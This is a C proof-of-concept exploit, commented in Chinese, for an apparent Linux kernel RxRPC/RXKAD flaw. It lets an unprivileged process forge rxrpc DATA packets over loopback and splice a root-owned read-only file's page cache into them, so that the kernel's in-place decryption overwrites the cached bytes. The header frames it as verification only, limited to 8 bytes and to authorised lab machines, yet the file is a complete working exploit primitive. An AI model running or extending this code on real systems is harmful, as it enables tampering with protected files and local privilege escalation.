// SPDX-License-Identifier: MIT
/*
 * rxrpc_primitive.c -- CVE-2026-43500 (RxRPC / RXKAD) page-cache write
 *                      原语验证 PoC (精简版, 不需要 root / prepare-lab)
 *
 * 目的: 验证"非特权进程能否通过共享 sk_buff 分片, 改写一个 root 拥有、
 *       只读文件的页缓存"。只改动目标文件前 8 字节的缓存视图, 不写磁盘、
 *       不覆盖 su/passwd、不装 payload。
 *
 * 原理 (对应 5.4 源码):
 *   rxkad_verify_packet_1() 对 splice 进来的页做 8 字节 pcbc(fcrypt)
 *   原地解密 (skb_to_sgvec -> skcipher_request_set_crypt(req, sg, sg, ...))。
 *   rxrpc_input_packet() 在 securityIndex != 0 时只调 skb_unshare(),
 *   而 skb_unshare() 仅检查 skb_cloned(), 不检查 shared paged frag,
 *   所以 splice 进来的页缓存被直接当作解密目标 -> 页内容被改。
 *
 * 触发方式: 攻击者冒充 rxrpc 服务器, 用普通 UDP socket 收发握手/DATA 包,
 *   真正的 AF_RXRPC client socket 在内核里处理 DATA 时走 rxkad 解密路径。
 *   因此不需要完成完整 rxkad 握手, 只要 epoch/cid/callNumber 匹配且
 *   cksum 用同一个 session_key 算对即可。
 *
 * 与公开 primitive-only 参考实现 (N4C sg-2026-0024 / V4bel dirtyfrag)
 * 的差别: 去掉 ESP 路径、去掉 root fixture / run-as-1000 包装,
 *   改为 -f 指定任意 root-owned 可读文件, 当前用户直接运行。
 *
 * 仅限你拥有或已获授权的一次性测试环境使用。
 */

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <poll.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <time.h>
#include <unistd.h>

#include <linux/if_alg.h>
#include <linux/keyctl.h>
#include <linux/rxrpc.h>

#ifndef AF_RXRPC
#define AF_RXRPC 33
#endif
#ifndef PF_RXRPC
#define PF_RXRPC AF_RXRPC
#endif
#ifndef SOL_RXRPC
#define SOL_RXRPC 272
#endif
#ifndef SOL_ALG
#define SOL_ALG 279
#endif
#ifndef AF_ALG
#define AF_ALG 38
#endif

/* ---- rxrpc wire 常量 ---- */
#define RXRPC_PACKET_TYPE_DATA      1
#define RXRPC_PACKET_TYPE_CHALLENGE 6
#define RXRPC_CLIENT_INITIATED      0x01
#define RXRPC_LAST_PACKET           0x04
#define RXRPC_CHANNELMASK           3
#define RXRPC_CIDSHIFT              2

struct rxrpc_wire_header {
	uint32_t epoch;
	uint32_t cid;
	uint32_t callNumber;
	uint32_t seq;
	uint32_t serial;
	uint8_t  type;
	uint8_t  flags;
	uint8_t  userStatus;
	uint8_t  securityIndex;
	uint16_t cksum;
	uint16_t serviceId;
} __attribute__((packed));

struct rxkad_challenge {
	uint32_t version;
	uint32_t nonce;
	uint32_t min_level;
	uint32_t __padding;
} __attribute__((packed));

/*
 * 攻击者自选的 8 字节 rxkad session key。
 * 这是整个原语的关键: 内核用它作为 pcbc(fcrypt) 的 key 和 IV,
 * 所以解密结果由它决定。验证阶段不需要它产出特定明文,
 * 只要页内容发生变化, 就说明"原地解密写页缓存"成立。
 */
static uint8_t SESSION_KEY[8] = { 0x01, 0x02, 0x03, 0x04,
				  0x05, 0x06, 0x07, 0x08 };

static int g_verbose;

#define LOG(fmt, ...)  fprintf(stderr, "[rxrpc] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define DBG(fmt, ...) do { if (g_verbose) fprintf(stderr, "    " fmt "\n", ##__VA_ARGS__); } while (0)

/* ======================================================================== */
/* rxkad v1 token: add_key("rxrpc", ...)                                     */
/* ======================================================================== */

static int build_rxrpc_v1_token(uint8_t *out, size_t maxlen)
{
	uint8_t *p = out;
	uint32_t now = (uint32_t)time(NULL);
	uint32_t expires = now + 86400;
	const char *cell = "evil";
	uint32_t clen = (uint32_t)strlen(cell);
	uint32_t pad = (4 - (clen & 3)) & 3;
	uint8_t *toklen_p, *tokstart;
	uint32_t toklen;

	*(uint32_t *)p = htonl(0); p += 4;              /* flags */
	*(uint32_t *)p = htonl(clen); p += 4;           /* cell 长度 */
	memcpy(p, cell, clen);
	memset(p + clen, 0, pad);
	p += clen + pad;
	*(uint32_t *)p = htonl(1); p += 4;              /* ntoken */
	toklen_p = p; p += 4;                           /* 占位: token 长度 */
	tokstart = p;
	*(uint32_t *)p = htonl(2); p += 4;              /* sec_ix = RXKAD */
	*(uint32_t *)p = htonl(0); p += 4;              /* vice_id */
	*(uint32_t *)p = htonl(1); p += 4;              /* kvno */
	memcpy(p, SESSION_KEY, 8); p += 8;              /* session key */
	*(uint32_t *)p = htonl(now); p += 4;            /* begin */
	*(uint32_t *)p = htonl(expires); p += 4;        /* end */
	*(uint32_t *)p = htonl(1); p += 4;              /* primary */
	*(uint32_t *)p = htonl(8); p += 4;              /* ticket 长度 */
	memset(p, 0xCC, 8); p += 8;                     /* ticket */
	toklen = (uint32_t)(p - tokstart);
	*(uint32_t *)toklen_p = htonl(toklen);
	if ((size_t)(p - out) > maxlen) {
		errno = E2BIG;
		return -1;
	}
	return (int)(p - out);
}

static long add_rxrpc_key(const char *desc)
{
	uint8_t buf[512];
	int n = build_rxrpc_v1_token(buf, sizeof(buf));

	if (n < 0)
		return -1;
	return syscall(SYS_add_key, "rxrpc", desc, buf, (size_t)n,
		       KEY_SPEC_PROCESS_KEYRING);
}

/* ======================================================================== */
/* AF_ALG pcbc(fcrypt)                                                      */
/* ======================================================================== */

static int alg_open_pcbc_fcrypt(const uint8_t key[8])
{
	int s = socket(AF_ALG, SOCK_SEQPACKET, 0);
	struct sockaddr_alg sa;

	if (s < 0) {
		WARN("socket(AF_ALG): %s", strerror(errno));
		return -1;
	}
	memset(&sa, 0, sizeof(sa));
	sa.salg_family = AF_ALG;
	strcpy((char *)sa.salg_type, "skcipher");
	strcpy((char *)sa.salg_name, "pcbc(fcrypt)");
	if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		WARN("bind(AF_ALG pcbc(fcrypt)): %s", strerror(errno));
		close(s);
		return -1;
	}
	if (setsockopt(s, SOL_ALG, ALG_SET_KEY, key, 8) < 0) {
		WARN("ALG_SET_KEY: %s", strerror(errno));
		close(s);
		return -1;
	}
	return s;
}

static int alg_op(int alg_s, int op, const uint8_t iv[8],
		  const void *in, size_t inlen, void *out)
{
	int op_fd = accept(alg_s, NULL, NULL);
	char cbuf[CMSG_SPACE(sizeof(int)) +
		  CMSG_SPACE(sizeof(struct af_alg_iv) + 8)];
	struct msghdr msg;
	struct cmsghdr *c;
	struct af_alg_iv *aiv;
	struct iovec iov;
	ssize_t n;

	if (op_fd < 0) {
		WARN("accept(AF_ALG): %s", strerror(errno));
		return -1;
	}
	memset(cbuf, 0, sizeof(cbuf));
	memset(&msg, 0, sizeof(msg));
	msg.msg_control = cbuf;
	msg.msg_controllen = sizeof(cbuf);

	c = CMSG_FIRSTHDR(&msg);
	c->cmsg_level = SOL_ALG;
	c->cmsg_type = ALG_SET_OP;
	c->cmsg_len = CMSG_LEN(sizeof(int));
	*(int *)CMSG_DATA(c) = op;

	c = CMSG_NXTHDR(&msg, c);
	c->cmsg_level = SOL_ALG;
	c->cmsg_type = ALG_SET_IV;
	c->cmsg_len = CMSG_LEN(sizeof(struct af_alg_iv) + 8);
	aiv = (struct af_alg_iv *)CMSG_DATA(c);
	aiv->ivlen = 8;
	memcpy(aiv->iv, iv, 8);

	iov.iov_base = (void *)in;
	iov.iov_len = inlen;
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

	if (sendmsg(op_fd, &msg, 0) < 0) {
		WARN("AF_ALG sendmsg: %s", strerror(errno));
		close(op_fd);
		return -1;
	}
	n = read(op_fd, out, inlen);
	close(op_fd);
	if (n != (ssize_t)inlen) {
		WARN("AF_ALG read %zd/%zu: %s", n, inlen, strerror(errno));
		return -1;
	}
	return 0;
}

/*
 * conn->rxkad.csum_iv (对应 rxkad_prime_packet_security):
 *   tmp[0..3] = htonl(epoch, cid, 0, sec_ix)  (16B)
 *   pcbc-encrypt(tmp, IV=session_key) -> out[16]
 *   csum_iv = out[8..15]
 */
static int compute_csum_iv(uint32_t epoch, uint32_t cid, uint32_t sec_ix,
			   const uint8_t key[8], uint8_t csum_iv[8])
{
	int s = alg_open_pcbc_fcrypt(key);
	uint32_t in[4];
	uint8_t out[16];
	int rc;

	if (s < 0)
		return -1;
	in[0] = htonl(epoch);
	in[1] = htonl(cid);
	in[2] = 0;
	in[3] = htonl(sec_ix);
	rc = alg_op(s, ALG_OP_ENCRYPT, key, in, 16, out);
	close(s);
	if (rc < 0)
		return -1;
	memcpy(csum_iv, out + 8, 8);
	return 0;
}

/*
 * wire cksum (对应 rxkad_secure_packet):
 *   x = ((cid & 3) << 30) | (seq & 0x3fffffff)
 *   buf[0] = htonl(call_id), buf[1] = htonl(x)  (8B)
 *   pcbc-encrypt(buf, IV=csum_iv) -> out[8]
 *   y = ntohl(out[1]); cksum = (y >> 16) & 0xffff; 0 -> 1
 */
static int compute_cksum(uint32_t cid, uint32_t call_id, uint32_t seq,
			 const uint8_t key[8], const uint8_t csum_iv[8],
			 uint16_t *cksum_out)
{
	int s = alg_open_pcbc_fcrypt(key);
	uint32_t x, in[2], out[2], y;
	uint16_t v;
	int rc;

	if (s < 0)
		return -1;
	x = (cid & RXRPC_CHANNELMASK) << (32 - RXRPC_CIDSHIFT);
	x |= seq & 0x3fffffff;
	in[0] = htonl(call_id);
	in[1] = htonl(x);
	rc = alg_op(s, ALG_OP_ENCRYPT, csum_iv, in, 8, out);
	close(s);
	if (rc < 0)
		return -1;
	y = ntohl(out[1]);
	v = (uint16_t)((y >> 16) & 0xffff);
	if (v == 0)
		v = 1;
	*cksum_out = v;
	return 0;
}

/* ======================================================================== */
/* AF_RXRPC client                                                          */
/* ======================================================================== */

static int setup_rxrpc_client(uint16_t local_port, const char *keyname)
{
	int fd = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
	struct sockaddr_rxrpc srx;
	int min_level = RXRPC_SECURITY_AUTH;

	if (fd < 0) {
		WARN("socket(AF_RXRPC client): %s", strerror(errno));
		return -1;
	}
	if (setsockopt(fd, SOL_RXRPC, RXRPC_SECURITY_KEY,
		       keyname, (socklen_t)strlen(keyname)) < 0) {
		WARN("client SECURITY_KEY: %s", strerror(errno));
		close(fd);
		return -1;
	}
	if (setsockopt(fd, SOL_RXRPC, RXRPC_MIN_SECURITY_LEVEL,
		       &min_level, sizeof(min_level)) < 0) {
		WARN("client MIN_SECURITY_LEVEL: %s", strerror(errno));
		close(fd);
		return -1;
	}
	memset(&srx, 0, sizeof(srx));
	srx.srx_family = AF_RXRPC;
	srx.srx_service = 0;
	srx.transport_type = SOCK_DGRAM;
	srx.transport_len = sizeof(struct sockaddr_in);
	srx.transport.sin.sin_family = AF_INET;
	srx.transport.sin.sin_port = htons(local_port);
	srx.transport.sin.sin_addr.s_addr = htonl(0x7F000001);
	if (bind(fd, (struct sockaddr *)&srx, sizeof(srx)) < 0) {
		WARN("client bind :%u: %s", local_port, strerror(errno));
		close(fd);
		return -1;
	}
	DBG("client bound :%u", local_port);
	return fd;
}

static int rxrpc_initiate_call(int cli_fd, uint16_t srv_port,
			       uint16_t service_id, unsigned long user_call_id)
{
	char data[8] = { 'P', 'I', 'N', 'G', 'P', 'I', 'N', 'G' };
	struct sockaddr_rxrpc srx;
	char cmsg_buf[CMSG_SPACE(sizeof(unsigned long))];
	struct msghdr msg;
	struct cmsghdr *cmsg;
	struct iovec iov;
	int fl, n;

	memset(&srx, 0, sizeof(srx));
	srx.srx_family = AF_RXRPC;
	srx.srx_service = service_id;
	srx.transport_type = SOCK_DGRAM;
	srx.transport_len = sizeof(struct sockaddr_in);
	srx.transport.sin.sin_family = AF_INET;
	srx.transport.sin.sin_port = htons(srv_port);
	srx.transport.sin.sin_addr.s_addr = htonl(0x7F000001);

	memset(&msg, 0, sizeof(msg));
	msg.msg_name = &srx;
	msg.msg_namelen = sizeof(srx);
	iov.iov_base = data;
	iov.iov_len = sizeof(data);
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	msg.msg_control = cmsg_buf;
	msg.msg_controllen = sizeof(cmsg_buf);
	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_RXRPC;
	cmsg->cmsg_type = RXRPC_USER_CALL_ID;
	cmsg->cmsg_len = CMSG_LEN(sizeof(unsigned long));
	*(unsigned long *)CMSG_DATA(cmsg) = user_call_id;

	fl = fcntl(cli_fd, F_GETFL);
	fcntl(cli_fd, F_SETFL, fl | O_NONBLOCK);
	n = (int)sendmsg(cli_fd, &msg, 0);
	fcntl(cli_fd, F_SETFL, fl);
	if (n < 0) {
		if (errno == EAGAIN || errno == EWOULDBLOCK) {
			DBG("sendmsg EAGAIN (handshake 异步进行, 正常)");
			return 0;
		}
		WARN("client sendmsg: %s", strerror(errno));
		return -1;
	}
	DBG("sendmsg %d B -> :%u", n, srv_port);
	return 0;
}

/* ======================================================================== */
/* 假服务器 (普通 UDP)                                                      */
/* ======================================================================== */

static int setup_udp_server(uint16_t port)
{
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	struct sockaddr_in sa;

	if (s < 0) {
		WARN("socket(udp): %s", strerror(errno));
		return -1;
	}
	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = htonl(0x7F000001);
	if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		WARN("udp bind :%u: %s", port, strerror(errno));
		close(s);
		return -1;
	}
	DBG("udp fake-server :%u", port);
	return s;
}

static ssize_t udp_recv_to(int s, void *buf, size_t cap,
			   struct sockaddr_in *from, int timeout_ms)
{
	struct pollfd pfd = { .fd = s, .events = POLLIN };
	socklen_t fl;
	int rc = poll(&pfd, 1, timeout_ms);

	if (rc <= 0)
		return -1;
	fl = from ? sizeof(*from) : 0;
	return recvfrom(s, buf, cap, 0, (struct sockaddr *)from,
			from ? &fl : NULL);
}

/* ======================================================================== */
/* 单次触发                                                                 */
/* ======================================================================== */

static int g_seq;

static int do_one_trigger(int target_fd, off_t splice_off, size_t splice_len)
{
	char keyname[32];
	uint16_t port_S, port_C, svc_id = 1234;
	uint8_t pkt[2048], csum_iv[8];
	struct sockaddr_in cli_addr;
	struct sockaddr_in dst;
	uint32_t epoch, cid, callN;
	uint16_t svc_in, cli_port, cksum_h;
	struct rxrpc_wire_header mal;
	ssize_t n;
	long key;
	int udp_srv, cli_fd, p[2];
	int ret = -1;

	snprintf(keyname, sizeof(keyname), "evil%d", g_seq++);
	key = add_rxrpc_key(keyname);
	if (key < 0) {
		DBG("add_rxrpc_key(%s): %s", keyname, strerror(errno));
		return -1;
	}

	port_S = (uint16_t)(7777 + (g_seq * 2 % 200));
	port_C = (uint16_t)(port_S + 1);

	udp_srv = setup_udp_server(port_S);
	if (udp_srv < 0)
		goto out_key;
	cli_fd = setup_rxrpc_client(port_C, keyname);
	if (cli_fd < 0)
		goto out_udp;

	/* 1. 发起 call: 内核对 port_S 发握手包 */
	if (rxrpc_initiate_call(cli_fd, port_S, svc_id, 0xDEAD) < 0)
		goto out_cli;

	/* 2. 从握手包提取 epoch/cid/callNumber/serviceId */
	n = udp_recv_to(udp_srv, pkt, sizeof(pkt), &cli_addr, 1500);
	if (n < (ssize_t)sizeof(struct rxrpc_wire_header)) {
		DBG("recv handshake n=%zd: %s", n, strerror(errno));
		goto out_cli;
	}
	{
		struct rxrpc_wire_header *wh = (struct rxrpc_wire_header *)pkt;

		epoch = ntohl(wh->epoch);
		cid = ntohl(wh->cid);
		callN = ntohl(wh->callNumber);
		svc_in = ntohs(wh->serviceId);
		cli_port = ntohs(cli_addr.sin_port);
	}
	DBG("handshake epoch=0x%x cid=0x%x call=%u svc=%u cli=:%u",
	    epoch, cid, callN, svc_in, cli_port);

	/* 3. 回 CHALLENGE, 让 client 侧 call 进入可收 DATA 状态 */
	{
		struct {
			struct rxrpc_wire_header hdr;
			struct rxkad_challenge ch;
		} __attribute__((packed)) c;
		struct sockaddr_in to;

		memset(&c, 0, sizeof(c));
		c.hdr.epoch = htonl(epoch);
		c.hdr.cid = htonl(cid);
		c.hdr.callNumber = 0;
		c.hdr.seq = 0;
		c.hdr.serial = htonl(0x10000);
		c.hdr.type = RXRPC_PACKET_TYPE_CHALLENGE;
		c.hdr.securityIndex = 2;
		c.hdr.serviceId = htons(svc_in);
		c.ch.version = htonl(2);
		c.ch.nonce = htonl(0xDEADBEEFu);
		c.ch.min_level = htonl(1);
		memset(&to, 0, sizeof(to));
		to.sin_family = AF_INET;
		to.sin_port = htons(cli_port);
		to.sin_addr.s_addr = htonl(0x7F000001);
		if (sendto(udp_srv, &c, sizeof(c), 0,
			   (struct sockaddr *)&to, sizeof(to)) < 0) {
			DBG("send CHALLENGE: %s", strerror(errno));
			goto out_cli;
		}
	}

	/* 4. 排空 RESPONSE (best-effort) */
	for (int i = 0; i < 4; i++) {
		struct sockaddr_in src;

		if (udp_recv_to(udp_srv, pkt, sizeof(pkt), &src, 500) < 0)
			break;
	}

	/* 5. 用 session_key 算 csum_iv / cksum */
	if (compute_csum_iv(epoch, cid, 2, SESSION_KEY, csum_iv) < 0)
		goto out_cli;
	if (compute_cksum(cid, callN, 1, SESSION_KEY, csum_iv, &cksum_h) < 0)
		goto out_cli;
	DBG("cksum=0x%04x", cksum_h);

	/* 6. 构造伪造 DATA 头 (securityIndex=2 => 走 rxkad 原地解密) */
	memset(&mal, 0, sizeof(mal));
	mal.epoch = htonl(epoch);
	mal.cid = htonl(cid);
	mal.callNumber = htonl(callN);
	mal.seq = htonl(1);
	mal.serial = htonl(0x42000);
	mal.type = RXRPC_PACKET_TYPE_DATA;
	mal.flags = RXRPC_LAST_PACKET;
	mal.securityIndex = 2;
	mal.cksum = htons(cksum_h);
	mal.serviceId = htons(svc_in);

	/* 7. vmsplice 头 + splice 目标文件页 -> pipe -> udp_srv */
	memset(&dst, 0, sizeof(dst));
	dst.sin_family = AF_INET;
	dst.sin_port = htons(cli_port);
	dst.sin_addr.s_addr = htonl(0x7F000001);
	if (connect(udp_srv, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
		DBG("udp connect: %s", strerror(errno));
		goto out_cli;
	}
	if (pipe(p) < 0)
		goto out_cli;
	{
		struct iovec viv = { .iov_base = &mal, .iov_len = sizeof(mal) };

		if (vmsplice(p[1], &viv, 1, 0) < 0) {
			DBG("vmsplice: %s", strerror(errno));
			close(p[0]); close(p[1]);
			goto out_cli;
		}
	}
	{
		loff_t off = (loff_t)splice_off;

		if (splice(target_fd, &off, p[1], NULL, splice_len,
			   SPLICE_F_NONBLOCK) < 0) {
			DBG("splice(file->pipe): %s", strerror(errno));
			close(p[0]); close(p[1]);
			goto out_cli;
		}
	}
	if (splice(p[0], NULL, udp_srv, NULL,
		   sizeof(mal) + splice_len, 0) < 0) {
		DBG("splice(pipe->udp): %s", strerror(errno));
		close(p[0]); close(p[1]);
		goto out_cli;
	}
	close(p[0]);
	close(p[1]);

	/* 8. client recvmsg, 触发内核 rxkad_verify_packet_1 原地解密 */
	{
		int fl = fcntl(cli_fd, F_GETFL);

		fcntl(cli_fd, F_SETFL, fl | O_NONBLOCK);
		for (int round = 0; round < 5; round++) {
			char rb[2048], ccb[256];
			struct sockaddr_rxrpc srx;
			struct msghdr m;
			struct iovec iv;
			ssize_t r;

			memset(&m, 0, sizeof(m));
			iv.iov_base = rb;
			iv.iov_len = sizeof(rb);
			m.msg_name = &srx;
			m.msg_namelen = sizeof(srx);
			m.msg_iov = &iv;
			m.msg_iovlen = 1;
			m.msg_control = ccb;
			m.msg_controllen = sizeof(ccb);
			r = recvmsg(cli_fd, &m, 0);
			if (r > 0)
				break;
			if (errno == EAGAIN || errno == EWOULDBLOCK)
				usleep(20000);
			else
				break;
		}
		fcntl(cli_fd, F_SETFL, fl);
	}

	ret = 0;

out_cli:
	close(cli_fd);
out_udp:
	close(udp_srv);
out_key:
	syscall(SYS_keyctl, 3 /* KEYCTL_INVALIDATE */, key);
	return ret;
}

/* ======================================================================== */
/* main                                                                     */
/* ======================================================================== */

static void hex8(const char *label, const uint8_t b[8])
{
	fprintf(stderr, "%s", label);
	for (int i = 0; i < 8; i++)
		fprintf(stderr, "%s%02x", i ? " " : "", b[i]);
	fputc('\n', stderr);
}

static void usage(const char *p)
{
	fprintf(stderr,
		"用法: %s [-f <root-owned 可读文件>] [-v]\n\n"
		"  -f <file>  作为 fixture 的目标文件 (默认 /etc/hostname)\n"
		"             需 root 拥有、当前用户可读、大小 >= 8 字节\n"
		"  -v         详细输出\n\n"
		"只验证: 目标文件前 8 字节的页缓存视图是否被改写; 不写磁盘。\n"
		"验证后用 root 执行: echo 3 > /proc/sys/vm/drop_caches\n",
		p);
}

int main(int argc, char **argv)
{
	const char *target = "/etc/hostname";
	uint8_t before[8], after[8];
	struct stat st;
	void *map;
	int fd, rc;

	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "-f") && i + 1 < argc) {
			target = argv[++i];
		} else if (!strcmp(argv[i], "-v")) {
			g_verbose = 1;
		} else if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help")) {
			usage(argv[0]);
			return 2;
		} else {
			usage(argv[0]);
			return 2;
		}
	}

	setvbuf(stderr, NULL, _IONBF, 0);

	/* 打开 AF_RXRPC 会顺带加载 rxkad key type */
	{
		int d = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);

		if (d < 0) {
			WARN("socket(AF_RXRPC): %s", strerror(errno));
			return 2;
		}
		close(d);
	}

	fd = open(target, O_RDONLY);
	if (fd < 0) {
		WARN("open %s: %s", target, strerror(errno));
		return 2;
	}
	if (fstat(fd, &st) < 0 || st.st_size < 8) {
		WARN("fixture 太小或不可用");
		close(fd);
		return 2;
	}
	if (st.st_uid != 0)
		WARN("注意: %s 不是 root 拥有 (uid=%u), 验证意义会减弱",
		     target, st.st_uid);

	map = mmap(NULL, 4096, PROT_READ, MAP_SHARED, fd, 0);
	if (map == MAP_FAILED) {
		WARN("mmap: %s", strerror(errno));
		close(fd);
		return 2;
	}
	memcpy(before, map, sizeof(before));
	LOG("target=%s uid=%u mode=%04o caller=%u", target, st.st_uid,
	    st.st_mode & 07777, getuid());
	hex8("[rxrpc] before: ", before);

	rc = do_one_trigger(fd, 0, sizeof(before));
	if (rc < 0) {
		WARN("协议触发失败 (未进入解密路径)");
		munmap(map, 4096);
		close(fd);
		return 3;
	}

	memcpy(after, map, sizeof(after));
	hex8("[rxrpc] after : ", after);
	munmap(map, 4096);
	close(fd);

	if (memcmp(before, after, sizeof(before)) == 0) {
		LOG("fixture 未变化: shared-frag 写入被拒 / 未触发");
		return 1;
	}
	LOG("原语可达: 8 字节页缓存已被改写");
	return 0;
}
